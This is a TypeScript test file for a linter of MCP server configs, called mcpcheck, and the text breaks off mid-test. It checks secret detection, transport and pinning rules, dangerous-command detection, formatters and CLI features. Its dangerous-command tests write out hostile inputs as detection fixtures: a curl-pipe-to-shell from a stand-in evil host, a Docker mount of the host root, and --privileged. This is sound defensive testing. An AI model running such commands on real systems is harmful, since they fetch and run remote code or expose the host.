import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, resolve } from "node:path";

import { checkSource } from "../src/core.js";
import { applyFixes } from "../src/fix.js";
import { stripJsonc } from "../src/jsonc.js";

const __dirname = dirname(fileURLToPath(import.meta.url));
const fx = (name: string) => readFileSync(resolve(__dirname, "fixtures", name), "utf8");

describe("checkSource - valid configs", () => {
  it("valid-stdio.json has no issues", () => {
    const report = checkSource(fx("valid-stdio.json"), "valid-stdio.json");
    assert.deepEqual(report.issues, []);
  });

  it("valid-http.json has no issues", () => {
    const report = checkSource(fx("valid-http.json"), "valid-http.json");
    assert.deepEqual(report.issues, []);
  });
});

describe("checkSource - rule triggers", () => {
  const report = checkSource(fx("broken.json"), "broken.json");
  const ids = new Set(report.issues.map((i) => i.ruleId));

  it("flags missing-transport", () => assert.ok(ids.has("missing-transport")));
  it("flags conflicting-transport (command + url)", () =>
    assert.ok(ids.has("conflicting-transport")));
  it("flags hardcoded-secret", () => assert.ok(ids.has("hardcoded-secret")));
  it("flags invalid-url (plain http)", () => assert.ok(ids.has("invalid-url")));
  it("flags invalid-transport", () => assert.ok(ids.has("invalid-transport")));
  it("flags relative-path", () => assert.ok(ids.has("relative-path")));
  it("flags unstable-reference (unpinned npx)", () =>
    assert.ok(ids.has("unstable-reference")));
  it("flags unknown-field", () => assert.ok(ids.has("unknown-field")));

  it("assigns line numbers", () => {
    const withLine = report.issues.filter((i) => typeof i.line === "number");
    assert.ok(withLine.length > 0, "expected at least one issue to have a line number");
  });
});

describe("checkSource - invalid JSON", () => {
  it("reports invalid-json fatally", () => {
    const report = checkSource("{ not: json", "invalid.json");
    assert.equal(report.fatal, true);
    assert.equal(report.issues.length, 1);
    assert.equal(report.issues[0]?.ruleId, "invalid-json");
  });
});

describe("checkSource - corner cases", () => {
  it("accepts env var substitution", () => {
    const src = `{
      "mcpServers": {
        "s": {
          "command": "node",
          "env": { "OPENAI_API_KEY": "\${OPENAI_API_KEY}" }
        }
      }
    }`;
    const report = checkSource(src, "x.json");
    assert.equal(
      report.issues.filter((i) => i.ruleId === "hardcoded-secret").length,
      0
    );
  });

  it("allows localhost http", () => {
    const src = `{"servers":{"dev":{"url":"http://localhost:8080"}}}`;
    const report = checkSource(src, "x.json");
    const urlIssues = report.issues.filter((i) => i.ruleId === "invalid-url");
    assert.equal(urlIssues.length, 0);
  });

  it("flags pinned npx as clean", () => {
    const src = `{"mcpServers":{"x":{"command":"npx","args":["-y","@org/pkg@1.2.3"]}}}`;
    const report = checkSource(src, "x.json");
    assert.equal(
      report.issues.filter((i) => i.ruleId === "unstable-reference").length,
      0
    );
  });

  it("flags unpinned docker", () => {
    const src = `{"mcpServers":{"x":{"command":"docker","args":["run","myimg:latest"]}}}`;
    const report = checkSource(src, "x.json");
    assert.ok(
      report.issues.some((i) => i.ruleId === "unstable-reference"),
      "expected unstable-reference for docker :latest"
    );
  });

  it("ignores docker subcommand and flag-values when finding the image", () => {
    const src = `{"mcpServers":{"x":{"command":"docker","args":["run","-i","--rm","-e","API_KEY","ghcr.io/foo/bar:1.0.0"]}}}`;
    const report = checkSource(src, "x.json");
    assert.equal(
      report.issues.filter((i) => i.ruleId === "unstable-reference").length,
      0,
      "a properly pinned docker image with flags should not be flagged"
    );
  });

  it("flags docker image with no tag", () => {
    const src = `{"mcpServers":{"x":{"command":"docker","args":["run","ghcr.io/foo/bar"]}}}`;
    const report = checkSource(src, "x.json");
    assert.ok(
      report.issues.some((i) => i.ruleId === "unstable-reference"),
      "expected unstable-reference for implicit :latest (no tag)"
    );
  });

  it("flags case-insensitive duplicate server names", () => {
    const src = `{"mcpServers":{"Foo":{"command":"a"},"foo":{"command":"b"}}}`;
    const report = checkSource(src, "x.json");
    assert.ok(
      report.issues.some((i) => i.ruleId === "duplicate-server-name"),
      "expected duplicate-server-name"
    );
  });
});

describe("checkSource - Zed context_servers", () => {
  it("zed-settings.json validates context_servers as a server map", () => {
    const report = checkSource(fx("zed-settings.json"), "zed-settings.json");
    // If the parser still ignored context_servers we'd get "empty-servers"
    // and no per-server issues at all.
    assert.equal(
      report.issues.filter((i) => i.ruleId === "empty-servers").length,
      0,
      "Zed context_servers should count as a valid server map"
    );
    // And we should at least pick up the existence of the two servers for
    // per-server rules — no structural error expected on this valid config.
    assert.deepEqual(report.issues, []);
  });
});

describe("checkSource - JSONC tolerance", () => {
  it("strips line and block comments and trailing commas", () => {
    const out = stripJsonc(`{
      // line
      "a": 1, /* block */
      "b": [1, 2, 3,],
    }`);
    const parsed = JSON.parse(out) as Record<string, unknown>;
    assert.deepEqual(parsed, { a: 1, b: [1, 2, 3] });
  });

  it("keeps // and /* untouched when they appear inside JSON strings", () => {
    const out = stripJsonc('{"url":"https://a//b","glob":"/*ignore*/"}');
    const parsed = JSON.parse(out) as Record<string, unknown>;
    assert.deepEqual(parsed, { url: "https://a//b", glob: "/*ignore*/" });
  });

  it("preserves line numbers so locate still points at the right line", () => {
    const report = checkSource(fx("claude-desktop-jsonc.json"), "x.json");
    // File is JSONC (comments + trailing commas). Before JSONC support, this
    // was a fatal invalid-json. Now it parses and we should get zero issues
    // on this valid config.
    assert.equal(report.fatal, false);
    assert.deepEqual(report.issues, []);
  });
});

describe("checkSource - Azure secret heuristic", () => {
  it("32-hex value is flagged only when the env var name hints Azure/OpenAI", () => {
    const report = checkSource(fx("azure-hint.json"), "azure-hint.json");
    const hits = report.issues
      .filter((i) => i.ruleId === "hardcoded-secret")
      .map((i) => i.jsonPath);
    assert.deepEqual(
      hits,
      ["mcpServers.oai.env.AZURE_OPENAI_API_KEY"],
      "Only AZURE_OPENAI_API_KEY should trip the 32-hex heuristic; SOMETHING_ELSE_HASH is noise"
    );
  });
});

describe("checkSource - expanded secret providers", () => {
  const cases: Array<[string, string, string]> = [
    ["GITLAB_TOKEN", "glpat-abcdefghij1234567890", "GitLab personal token"],
    ["TWILIO_API_KEY", "SK" + "a".repeat(32), "Twilio API key"],
    ["SENDGRID_KEY", "SG." + "a".repeat(22) + "." + "b".repeat(43), "SendGrid API key"],
    ["HF_TOKEN", "hf_" + "a".repeat(35), "Hugging Face token"],
    ["NPM_TOKEN", "npm_" + "a".repeat(36), "npm access token"],
    ["MAILGUN_KEY", "key-" + "a".repeat(32), "Mailgun API key"],
    ["REPLICATE_TOKEN", "r8_" + "a".repeat(40), "Replicate API token"],
    ["PERPLEXITY_KEY", "pplx-" + "a".repeat(40), "Perplexity API key"],
    ["GROQ_API_KEY", "gsk_" + "a".repeat(40), "Groq API key"],
    ["XAI_KEY", "xai-" + "a".repeat(30), "xAI (Grok) API key"],
    ["CLOUDFLARE_API_TOKEN", "a".repeat(40), "Cloudflare API token"],
    ["DATADOG_API_KEY", "a".repeat(32), "Datadog API key"],
    ["DATABASE_URL", "postgres://user:s3cret@db.example.com/app", "PostgreSQL URI with password"],
    ["MONGO_URL", "mongodb+srv://user:s3cret@cluster.mongodb.net/app", "MongoDB URI with password"],
    ["FIGMA_TOKEN", "figd_" + "a".repeat(44), "Figma personal access token"],
    ["NOTION_API_TOKEN", "secret_" + "a".repeat(43), "Notion API token"],
    ["LINEAR_API_KEY", "lin_api_" + "a".repeat(42), "Linear API key"],
    ["SENTRY_AUTH_TOKEN", "sntrys_" + "a".repeat(64), "Sentry auth token"],
    ["AUTH0_CLIENT_SECRET", "a".repeat(64), "Auth0 client secret"],
    ["PLANETSCALE_TOKEN", "pscale_oauth_" + "a".repeat(44), "PlanetScale API token"],
    ["SUPABASE_SERVICE_ROLE_KEY", "eyJ" + "a".repeat(18) + "." + "b".repeat(18) + "." + "c".repeat(18), "Supabase service_role / anon JWT"],
    // Synthetic value that matches the Discord regex (three dotted segments
    // of the right lengths) without looking like a real base64-encoded
    // snowflake id. We use uppercase placeholder runs so GitHub's secret
    // scanner doesn't flag the fixture itself.
    [
      "DISCORD_BOT_TOKEN",
      "FAKEFAKEFAKEFAKEFAKEFAKE.FAKEFA.FAKEFAKEFAKEFAKEFAKEFAKEFAK",
      "Discord bot token",
    ],
  ];
  for (const [envKey, value, label] of cases) {
    it(`flags ${label}`, () => {
      const src = `{"mcpServers":{"s":{"command":"node","env":{"${envKey}":"${value}"}}}}`;
      const report = checkSource(src, "x.json");
      const hits = report.issues.filter((i) => i.ruleId === "hardcoded-secret");
      assert.equal(hits.length, 1, `expected 1 hardcoded-secret for ${label}`);
      assert.ok(
        hits[0]!.message.includes(label),
        `message should mention "${label}", got: ${hits[0]!.message}`
      );
    });
  }

  it("flags a Google Cloud service-account JSON pasted into a single env value", () => {
    const blob = JSON.stringify({
      type: "service_account",
      project_id: "demo",
      private_key_id: "a".repeat(40),
      private_key: "-----BEGIN PRIVATE KEY-----\\n...\\n-----END PRIVATE KEY-----\\n",
    });
    // JSON-in-JSON: the literal `"` inside have to be escaped for the outer JSON.
    const escaped = blob.replace(/\\/g, "\\\\").replace(/"/g, '\\"');
    const src = `{"mcpServers":{"s":{"command":"node","env":{"GCP_KEY":"${escaped}"}}}}`;
    const report = checkSource(src, "x.json");
    assert.ok(
      report.issues.some((i) => i.ruleId === "hardcoded-secret"),
      "expected GCP service-account JSON to trigger hardcoded-secret"
    );
  });
});

describe("dangerous-command rule", () => {
  it("flags sudo as the command", () => {
    const src = `{"mcpServers":{"s":{"command":"sudo","args":["/opt/foo"]}}}`;
    const report = checkSource(src, "x.json");
    assert.ok(report.issues.some((i) => i.ruleId === "dangerous-command"));
  });

  it("flags curl | sh through bash -c", () => {
    const src = `{"mcpServers":{"s":{"command":"bash","args":["-c","curl https://evil.example.com/install.sh | sh"]}}}`;
    const report = checkSource(src, "x.json");
    assert.ok(
      report.issues.some(
        (i) => i.ruleId === "dangerous-command" && i.message.includes("remote fetch")
      ),
      "should detect fetcher + shell-pipe sink"
    );
  });

  it("flags docker -v /:/host", () => {
    const src = `{"mcpServers":{"s":{"command":"docker","args":["run","-v","/:/host","alpine:3.20"]}}}`;
    const report = checkSource(src, "x.json");
    assert.ok(
      report.issues.some(
        (i) => i.ruleId === "dangerous-command" && i.message.includes("host root")
      )
    );
  });

  it("flags docker --privileged", () => {
    const src = `{"mcpServers":{"s":{"command":"docker","args":["run","--privileged","alpine:3.20"]}}}`;
    const report = checkSource(src, "x.json");
    assert.ok(
      report.issues.some(
        (i) => i.ruleId === "dangerous-command" && i.message.includes("--privileged")
      )
    );
  });

  it("flags --unsafe-perm", () => {
    const src = `{"mcpServers":{"s":{"command":"npx","args":["--unsafe-perm","-y","@org/pkg@1.0.0"]}}}`;
    const report = checkSource(src, "x.json");
    assert.ok(
      report.issues.some(
        (i) => i.ruleId === "dangerous-command" && i.message.includes("run as root")
      )
    );
  });

  it("does not flag a plain docker pinned image", () => {
    const src = `{"mcpServers":{"s":{"command":"docker","args":["run","-i","--rm","-v","/tmp/data:/data","alpine:3.20"]}}}`;
    const report = checkSource(src, "x.json");
    assert.equal(
      report.issues.filter((i) => i.ruleId === "dangerous-command").length,
      0,
      "a safe docker run should not trip dangerous-command"
    );
  });

  it("does not flag curl alone or bash alone", () => {
    const src = `{"mcpServers":{"s":{"command":"curl","args":["-o","/tmp/x","https://example.com/x"]}}}`;
    const report = checkSource(src, "x.json");
    // curl with no pipe to a shell is not by itself a dangerous-command finding
    // (the client runs curl every launch, which is a separate concern — let
    // users decide).
    assert.equal(
      report.issues.filter((i) => i.ruleId === "dangerous-command").length,
      0
    );
  });
});

describe("unknown-field 'did you mean' suggestions", () => {
  it("suggests the nearest known field for a typo", async () => {
    const { checkSource } = await import("../src/core.js");
    const src = `{"mcpServers":{"s":{"command":"x","commnad":"y"}}}`;
    const report = checkSource(src, "x.json");
    const msg = report.issues.find((i) => i.ruleId === "unknown-field")?.message;
    assert.ok(msg, "unknown-field should fire on 'commnad'");
    assert.ok(msg!.includes('Did you mean "command"'), `expected suggestion, got: ${msg}`);
  });

  it("omits the hint when nothing is close enough", async () => {
    const { checkSource } = await import("../src/core.js");
    const src = `{"mcpServers":{"s":{"command":"x","zzztotally_foreign":"y"}}}`;
    const report = checkSource(src, "x.json");
    const msg = report.issues.find((i) => i.ruleId === "unknown-field")?.message;
    assert.ok(msg);
    assert.ok(!msg!.includes("Did you mean"), `should not suggest, got: ${msg}`);
  });
});

describe("formatters (markdown, junit)", () => {
  it("formatMarkdown renders a table per file with issue counts", async () => {
    const { formatMarkdown } = await import("../src/formatters/markdown.js");
    const report = {
      files: [
        {
          file: "a.json",
          fatal: false,
          issues: [
            {
              ruleId: "hardcoded-secret",
              severity: "error" as const,
              message: "leak",
              jsonPath: "mcpServers.s.env.X",
              line: 4,
            },
          ],
        },
      ],
      errorCount: 1,
      warningCount: 0,
      infoCount: 0,
      durationMs: 1,
    };
    const md = formatMarkdown(report);
    assert.ok(md.includes("# mcpcheck report"));
    assert.ok(md.includes("**1** error(s)"));
    assert.ok(md.includes("`hardcoded-secret`"));
    assert.ok(md.includes("<details>"));
  });

  it("formatJunit produces one testsuite per file, failures for errors", async () => {
    const { formatJunit } = await import("../src/formatters/junit.js");
    const report = {
      files: [
        {
          file: "a.json",
          fatal: false,
          issues: [
            {
              ruleId: "hardcoded-secret",
              severity: "error" as const,
              message: "leak",
              jsonPath: "mcpServers.s.env.X",
            },
          ],
        },
      ],
      errorCount: 1,
      warningCount: 0,
      infoCount: 0,
      durationMs: 1,
    };
    const xml = formatJunit(report);
    assert.ok(xml.startsWith('<?xml'));
    assert.ok(xml.includes('<testsuites name="mcpcheck"'));
    assert.ok(xml.includes('failures="1"'));
    assert.ok(xml.includes('<failure '));
    assert.ok(xml.includes("hardcoded-secret"));
  });
});

describe("lsp-server (spawned)", () => {
  it("initialize + didOpen on broken.json publishes non-empty diagnostics", async () => {
    const { spawn } = await import("node:child_process");
    const { fileURLToPath } = await import("node:url");
    const { dirname, resolve } = await import("node:path");
    const { readFile } = await import("node:fs/promises");

    const here = dirname(fileURLToPath(import.meta.url));
    const cli = resolve(here, "..", "dist", "cli.js");
    const fixture = resolve(here, "fixtures", "broken.json");
    const fixtureText = await readFile(fixture, "utf8");
    // The LSP server gates linting by filename; present the fixture's
    // contents under a recognisable MCP path so the gate fires.
    const fixtureUri = "file:///tmp/mcpcheck-lsp-test/mcp.json";

    const child = spawn("node", [cli, "lsp"], { stdio: ["pipe", "pipe", "pipe"] });

    const sendLsp = (o: unknown) => {
      const body = JSON.stringify(o);
      const header = `Content-Length: ${Buffer.byteLength(body, "utf8")}\r\n\r\n`;
      child.stdin.write(header + body);
    };

    let buf = "";
    const waitForDiagnostics = (): Promise<unknown> =>
      new Promise((resolveP, rejectP) => {
        const timer = setTimeout(() => rejectP(new Error("LSP diagnostics timeout")), 3000);
        child.stdout.on("data", (chunk: Buffer) => {
          buf += chunk.toString("utf8");
          for (;;) {
            const headerEnd = buf.indexOf("\r\n\r\n");
            if (headerEnd < 0) return;
            const m = /Content-Length:\s*(\d+)/i.exec(buf.slice(0, headerEnd));
            if (!m) {
              buf = buf.slice(headerEnd + 4);
              continue;
            }
            const len = Number.parseInt(m[1]!, 10);
            const start = headerEnd + 4;
            if (buf.length < start + len) return;
            const body = buf.slice(start, start + len);
            buf = buf.slice(start + len);
            try {
              const msg = JSON.parse(body) as {
                method?: string;
                params?: { diagnostics?: unknown[] };
              };
              if (
                msg.method === "textDocument/publishDiagnostics" &&
                Array.isArray(msg.params?.diagnostics) &&
                (msg.params!.diagnostics!.length ?? 0) > 0
              ) {
                clearTimeout(timer);
                resolveP(msg.params!.diagnostics!);
                return;
              }
            } catch {
              // ignore
            }
          }
        });
      });

    try {
      sendLsp({
        jsonrpc: "2.0",
        id: 1,
        method: "initialize",
        params: { processId: null, clientInfo: { name: "test" }, capabilities: {} },
      });
      sendLsp({ jsonrpc: "2.0", method: "initialized", params: {} });
      sendLsp({
        jsonrpc: "2.0",
        method: "textDocument/didOpen",
        params: {
          textDocument: {
            uri: fixtureUri,
            languageId: "json",
            version: 1,
            text: fixtureText,
          },
        },
      });

      const diags = (await waitForDiagnostics()) as Array<{ code: string; severity: number }>;
      assert.ok(diags.length > 0);
      assert.ok(diags.some((d) => d.code === "hardcoded-secret"));
      assert.ok(diags.some((d) => d.severity === 1), "should have at least one error-level diagnostic");
    } finally {
      child.kill("SIGTERM");
    }
  });
});

describe("mcp-server (spawned)", () => {
  it("completes initialize → tools/list → tools/call(list_rules) over stdio", async () => {
    const { spawn } = await import("node:child_process");
    const { fileURLToPath } = await import("node:url");
    const { dirname, resolve } = await import("node:path");

    const here = dirname(fileURLToPath(import.meta.url));
    const cli = resolve(here, "..", "dist", "cli.js");
    const child = spawn("node", [cli, "mcp-server"], {
      stdio: ["pipe", "pipe", "pipe"],
    });

    const stdout: string[] = [];
    let leftover = "";
    child.stdout.setEncoding("utf8");
    const awaitLines = (n: number): Promise<string[]> =>
      new Promise((resolveP) => {
        const check = () => {
          if (stdout.length >= n) resolveP(stdout.slice(0, n));
        };
        child.stdout.on("data", (chunk: string) => {
          leftover += chunk;
          let nl = leftover.indexOf("\n");
          while (nl >= 0) {
            stdout.push(leftover.slice(0, nl));
            leftover = leftover.slice(nl + 1);
            nl = leftover.indexOf("\n");
          }
          check();
        });
        check();
      });

    const send = (o: unknown) => child.stdin.write(JSON.stringify(o) + "\n");

    try {
      send({ jsonrpc: "2.0", id: 1, method: "initialize", params: {} });
      send({ jsonrpc: "2.0", method: "notifications/initialized" });
      send({ jsonrpc: "2.0", id: 2, method: "tools/list" });
      send({
        jsonrpc: "2.0",
        id: 3,
        method: "tools/call",
        params: { name: "list_rules", arguments: {} },
      });

      const lines = await awaitLines(3);
      const initResp = JSON.parse(lines[0]!);
      assert.equal(initResp.id, 1);
      assert.equal(initResp.result.protocolVersion, "2024-11-05");
      assert.ok(initResp.result.capabilities.tools, "server should advertise tools capability");

      const toolsResp = JSON.parse(lines[1]!);
      assert.equal(toolsResp.id, 2);
      const toolNames = (toolsResp.result.tools as { name: string }[]).map((t) => t.name);
      assert.ok(toolNames.includes("lint_config"));
      assert.ok(toolNames.includes("explain_rule"));
      assert.ok(toolNames.includes("list_rules"));
      assert.ok(toolNames.includes("fix_config"));

      const callResp = JSON.parse(lines[2]!);
      assert.equal(callResp.id, 3);
      const listText: string = callResp.result.content[0].text;
      assert.ok(listText.includes("hardcoded-secret"));
      assert.ok(listText.includes("dangerous-command"));
    } finally {
      child.kill("SIGTERM");
    }
  });
});

describe("merge + convert transforms", () => {
  it("mergeConfigs unions server maps with later-wins", async () => {
    const { mergeConfigs } = await import("../src/transform.js");
    const merged = mergeConfigs(
      { mcpServers: { a: { command: "x" }, shared: { command: "old" } } },
      { mcpServers: { b: { command: "y" }, shared: { command: "new" } } }
    ) as { mcpServers: Record<string, { command: string }> };
    assert.deepEqual(Object.keys(merged.mcpServers).sort(), ["a", "b", "shared"]);
    assert.equal(merged.mcpServers["shared"]!.command, "new");
  });

  it("mergeConfigs collapses overlapping server-map keys into mcpServers", async () => {
    const { mergeConfigs } = await import("../src/transform.js");
    const merged = mergeConfigs(
      { mcpServers: { a: { command: "x" } } },
      { context_servers: { b: { command: "y" } } }
    ) as { mcpServers: Record<string, unknown>; context_servers?: unknown };
    assert.deepEqual(Object.keys(merged.mcpServers).sort(), ["a", "b"]);
    assert.equal(merged.context_servers, undefined);
  });

  it("convertConfig rewrites the top-level server key", async () => {
    const { convertConfig } = await import("../src/transform.js");
    const zed = convertConfig(
      { mcpServers: { a: { command: "x" } } },
      "zed"
    ) as { context_servers: Record<string, unknown>; mcpServers?: unknown };
    assert.deepEqual(Object.keys(zed.context_servers), ["a"]);
    assert.equal(zed.mcpServers, undefined);
  });
});

describe("profile presets", () => {
  it("strict escalates warning-default rules to error", async () => {
    const { applyProfile } = await import("../src/profiles.js");
    const cfg = applyProfile("strict");
    assert.equal(cfg.rules.unknownField.severity, "error");
    assert.equal(cfg.rules.relativePath.severity, "error");
    assert.equal(cfg.rules.unstableReference.severity, "error");
    // Security-critical rules were already error; still error.
    assert.equal(cfg.rules.hardcodedSecret.severity, "error");
    assert.equal(cfg.rules.dangerousCommand.severity, "error");
  });

  it("permissive downgrades hygiene rules to info but keeps security at error", async () => {
    const { applyProfile } = await import("../src/profiles.js");
    const cfg = applyProfile("permissive");
    assert.equal(cfg.rules.unknownField.severity, "info");
    assert.equal(cfg.rules.relativePath.severity, "info");
    assert.equal(cfg.rules.unstableReference.severity, "info");
    assert.equal(cfg.rules.hardcodedSecret.severity, "error");
    assert.equal(cfg.rules.dangerousCommand.severity, "error");
  });

  it("ci keeps defaults but escalates unknownField to error", async () => {
    const { applyProfile } = await import("../src/profiles.js");
    const cfg = applyProfile("ci");
    assert.equal(cfg.rules.unknownField.severity, "error");
    assert.equal(cfg.rules.relativePath.severity, "warning");
  });
});

describe("shell completions", () => {
  it("generates scripts for bash, zsh, and fish that mention every subcommand", async () => {
    const { completionFor, listShells } = await import("../src/completions.js");
    const SUBS = ["init", "diff", "stats", "doctor", "upgrade-pins", "completions"];
    for (const sh of listShells()) {
      const script = completionFor(sh);
      assert.ok(script.length > 200, `${sh} script too short: ${script.length} bytes`);
      for (const sub of SUBS) {
        assert.ok(script.includes(sub), `${sh} script missing subcommand "${sub}"`);
      }
    }
  });

  it("inlines the current rule-id set into the explain completion", async () => {
    const { completionFor } = await import("../src/completions.js");
    const { listRuleIds } = await import("../src/rule-docs.js");
    const bash = completionFor("bash");
    for (const id of listRuleIds()) {
      assert.ok(bash.includes(id), `bash completion missing rule id "${id}"`);
    }
  });
});

describe(".mcpcheckignore", () => {
  it("parses gitignore-ish patterns and filters paths", async () => {
    const { parseIgnore, filterIgnored } = await import("../src/ignore.js");
    const rules = parseIgnore(
      ["# comment", "", "node_modules/**", "*.backup.json", "!keep.backup.json"].join("\n")
    );
    const paths = [
      "mcp.json",
      "node_modules/foo/mcp.json",
      "old.backup.json",
      "keep.backup.json",
    ];
    const kept = filterIgnored(paths, rules);
    assert.deepEqual(kept.sort(), ["keep.backup.json", "mcp.json"].sort());
  });
});

describe("upgrade-pins", () => {
  it("rewrites an unpinned npx package using a stubbed fetch", async () => {
    const { upgradePins } = await import("../src/upgrade-pins.js");
    const { mkdtemp, writeFile, readFile } = await import("node:fs/promises");
    const { tmpdir } = await import("node:os");
    const { join } = await import("node:path");

    const dir = await mkdtemp(join(tmpdir(), "mcp-upgrade-"));
    const file = join(dir, "mcp.json");
    await writeFile(
      file,
      `{
  "mcpServers": {
    "fs": { "command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"] }
  }
}
`,
      "utf8"
    );

    // Stub fetch to return a fake "latest" version without touching the network.
    const fakeFetch = (async (_url: string | URL) => {
      return new Response(JSON.stringify({ version: "9.9.9" }), {
        status: 200,
        headers: { "content-type": "application/json" },
      });
    }) as typeof fetch;

    const dry = await upgradePins(file, { write: false, fetchImpl: fakeFetch });
    assert.equal(dry.changes.length, 1);
    assert.equal(dry.changes[0]!.newPkg, "@modelcontextprotocol/server-filesystem@9.9.9");
    // Dry-run left the file alone.
    assert.ok(!(await readFile(file, "utf8")).includes("@9.9.9"));

    const live = await upgradePins(file, { write: true, fetchImpl: fakeFetch });
    assert.equal(live.changes.length, 1);
    const rewritten = await readFile(file, "utf8");
    assert.ok(rewritten.includes("@modelcontextprotocol/server-filesystem@9.9.9"));
    assert.ok(!rewritten.includes('"@modelcontextprotocol/server-filesystem"'));
  });

  it("skips packages that are already pinned", async () => {
    const { upgradePins } = await import("../src/upgrade-pins.js");
    const { mkdtemp, writeFile } = await import("node:fs/promises");
    const { tmpdir } = await import("node:os");
    const { join } = await import("node:path");

    const dir = await mkdtemp(join(tmpdir(), "mcp-upgrade-"));
    const file = join(dir, "mcp.json");
    await writeFile(
      file,
      `{"mcpServers":{"fs":{"command":"npx","args":["-y","@org/pkg@1.2.3"]}}}`,
      "utf8"
    );
    let calls = 0;
    const neverFetch = (async () => {
      calls += 1;
      return new Response("{}", { status: 200 });
    }) as typeof fetch;
    const result = await upgradePins(file, { write: true, fetchImpl: neverFetch });
    assert.equal(result.changes.length, 0);
    assert.equal(calls, 0, "already-pinned packages should not hit the registry");
  });
});

describe("baseline mode", () => {
  it("buildBaseline captures ruleId + jsonPath but not message", async () => {
    const { buildBaseline } = await import("../src/baseline.js");
    const baseline = buildBaseline([
      {
        file: "a.json",
        fatal: false,
        issues: [
          { ruleId: "r1", severity: "error", message: "version 1", jsonPath: "x" },
        ],
      },
    ]);
    assert.equal(baseline.version, 1);
    assert.equal(baseline.entries.length, 1);
    assert.deepEqual(
      { file: baseline.entries[0]!.file, ruleId: baseline.entries[0]!.ruleId, jsonPath: baseline.entries[0]!.jsonPath },
      { file: "a.json", ruleId: "r1", jsonPath: "x" }
    );
  });

  it("applyBaseline keeps new issues and counts suppressed ones", async () => {
    const { applyBaseline, entryKey } = await import("../src/baseline.js");
    const baseline = new Set<string>([entryKey("a.json", "r1", "x")]);
    const out = applyBaseline(
      [
        {
          file: "a.json",
          fatal: false,
          issues: [
            { ruleId: "r1", severity: "error", message: "pre-existing", jsonPath: "x" },
            { ruleId: "r2", severity: "warning", message: "new finding", jsonPath: "y" },
          ],
        },
      ],
      baseline
    );
    assert.equal(out.suppressed, 1);
    assert.equal(out.files[0]!.issues.length, 1);
    assert.equal(out.files[0]!.issues[0]!.ruleId, "r2");
  });

  it("applyBaseline is robust to messages changing between runs", async () => {
    const { applyBaseline, entryKey } = await import("../src/baseline.js");
    const baseline = new Set<string>([entryKey("a.json", "r1", "x")]);
    const out = applyBaseline(
      [
        {
          file: "a.json",
          fatal: false,
          issues: [
            { ruleId: "r1", severity: "error", message: "slightly reworded", jsonPath: "x" },
          ],
        },
      ],
      baseline
    );
    // Same rule+path, different message — still suppressed.
    assert.equal(out.suppressed, 1);
    assert.equal(out.files[0]!.issues.length, 0);
  });
});

describe("mcpcheck doctor", () => {
  it("formats the table and picks a sane exit code", async () => {
    const { formatDoctorText, doctorExitCode } = await import("../src/doctor.js");
    const statuses = [
      {
        client: "Claude Desktop" as const,
        path: "~/foo.json",
        installed: true,
        servers: 2,
        errors: 0,
        warnings: 0,
      },
      { client: "Cursor" as const, installed: false },
      {
        client: "Windsurf" as const,
        path: "~/bar.json",
        installed: true,
        servers: 1,
        errors: 1,
        warnings: 0,
      },
    ];
    const txt = formatDoctorText(statuses);
    assert.ok(txt.includes("Claude Desktop"));
    assert.ok(txt.includes("(not installed)"));
    assert.ok(txt.includes("1 error(s)"));
    assert.equal(doctorExitCode(statuses), 1);
    assert.equal(
      doctorExitCode([{ client: "Zed" as const, installed: false }]),
      0
    );
  });
});

describe("mcpcheck stats", () => {
  it("reports transport mix, pinning, env count for a config", async () => {
    const { statsFromSource } = await import("../src/stats.js");
    const source = `{
      "mcpServers": {
        "pinned":   { "command": "npx", "args": ["-y", "@org/pkg@1.2.3"] },
        "unpinned": { "command": "npx", "args": ["-y", "@org/other"] },
        "remote":   { "url": "https://example.com/mcp" },
        "docker":   { "command": "docker", "args": ["run", "img:1.0.0"] },
        "off":      { "command": "node", "args": ["s.js"], "disabled": true, "env": { "A": "b" } }
      }
    }`;
    const s = statsFromSource(source, "x.json");
    assert.equal(s.totalServers, 5);
    assert.equal(s.byTransport.stdio, 4);
    assert.equal(s.byTransport.url, 1);
    assert.equal(s.byPackageRunner.npx, 2);
    assert.equal(s.byPackageRunner.docker, 1);
    assert.equal(s.pinnedPackages, 2);   // pinned + docker img:1.0.0
    assert.equal(s.unpinnedPackages, 1); // "unpinned"
    assert.equal(s.serversWithEnv, 1);
    assert.equal(s.disabledServers, 1);
  });

  it("returns zeros on unparseable source", async () => {
    const { statsFromSource } = await import("../src/stats.js");
    const s = statsFromSource("{ not: json", "x.json");
    assert.equal(s.totalServers, 0);
  });
});

describe("diffReports", () => {
  it("classifies added / removed / unchanged correctly", async () => {
    const { diffReports } = await import("../src/diff.js");
    const base = [
      { ruleId: "r1", severity: "error" as const, message: "m1", jsonPath: "a" },
      { ruleId: "r2", severity: "error" as const, message: "m2", jsonPath: "b" },
    ];
    const after = [
      { ruleId: "r2", severity: "error" as const, message: "m2", jsonPath: "b" },
      { ruleId: "r3", severity: "warning" as const, message: "m3", jsonPath: "c" },
    ];
    const diff = diffReports(base, after);
    assert.equal(diff.added.length, 1);
    assert.equal(diff.added[0]!.ruleId, "r3");
    assert.equal(diff.removed.length, 1);
    assert.equal(diff.removed[0]!.ruleId, "r1");
    assert.equal(diff.unchanged, 1);
  });
});

describe("--client flag mappings", () => {
  it("every known client produces a non-empty path list, unknown returns undefined", async () => {
    const { pathsForClient, knownClients } = await import("../src/cli-metadata.js");
    const names = knownClients();
    assert.ok(names.length >= 6, `expected at least 6 clients, got ${names.length}`);
    for (const n of names) {
      const paths = pathsForClient(n);
      assert.ok(paths && paths.length > 0, `client "${n}" should have at least one path`);
    }
    assert.equal(pathsForClient("does-not-exist"), undefined);
    // Spot-check: Cursor's paths are Cursor-shaped.
    assert.ok(pathsForClient("cursor")!.some((p) => p.includes(".cursor/mcp.json")));
    // Zed's paths use the Zed settings file.
    assert.ok(pathsForClient("zed")!.some((p) => p.includes("zed/settings.json")));
  });
});

describe("init", () => {
  it("writes both files in a clean dir and refuses to overwrite without --force", async () => {
    const { runInit } = await import("../src/init.js");
    const { mkdtemp, readFile } = await import("node:fs/promises");
    const { tmpdir } = await import("node:os");
    const { join } = await import("node:path");

    const dir = await mkdtemp(join(tmpdir(), "mcpcheck-init-"));

    const first = await runInit({ cwd: dir, force: false });
    assert.deepEqual(first.written.sort(), [
      ".github/workflows/mcpcheck.yml",
      "mcpcheck.config.json",
    ]);
    assert.deepEqual(first.skipped, []);

    const cfg = JSON.parse(await readFile(join(dir, "mcpcheck.config.json"), "utf8")) as {
